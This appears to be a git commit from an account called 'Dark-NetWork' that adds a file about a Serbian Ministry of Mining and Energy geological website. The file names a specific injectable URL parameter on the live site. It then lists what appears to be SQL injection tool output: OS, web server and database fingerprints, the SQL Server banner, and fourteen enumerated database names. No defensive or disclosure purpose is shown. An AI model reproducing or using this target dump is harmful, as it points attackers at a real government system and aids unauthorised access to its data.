1576145b50f458393f066b63929150238dfb3b22
Dark-NetWork <70242966+Dark-NetWork@users.noreply.github.com>
2021-07-01 00:16:12 +0300

    Create geoliss.mre.gov.rs

---
+++ geoliss.mre.gov.rs
@@ -0,0 +1,38 @@
+.gov Government 
+
+.rs Serbia
+
+Geological Information System of Serbia
+
+Ministry of Mining And Energy of The Republic of Serbia
+
+http://geoliss.mre.gov.rs/beware/form/detalji_klizista.php?id=194
+
+the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 7 or 2008 R2
+web application technology: PHP 5.2.14, Microsoft IIS 7.5
+back-end DBMS operating system: Windows 7 or 2008 R2 Service Pack 1
+back-end DBMS: Microsoft SQL Server 2012
+banner:
+---
+Microsoft SQL Server 2012 (SP1) - 11.0.3156.0 (X64) 
+	May  4 2015 18:48:09 
+	Copyright (c) Microsoft Corporation
+	Standard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)
+---
+
+available databases [14]:                                                                                                                            
+[*] beware
+[*] fodib
+[*] GeolIEP_Sde
+[*] GeolIEPpom
+[*] geoliss_test
+[*] geolweb
+[*] IRindeks
+[*] master
+[*] model
+[*] mreZahtevi
+[*] msdb
+[*] pomBaza
+[*] tempdb
+[*] test
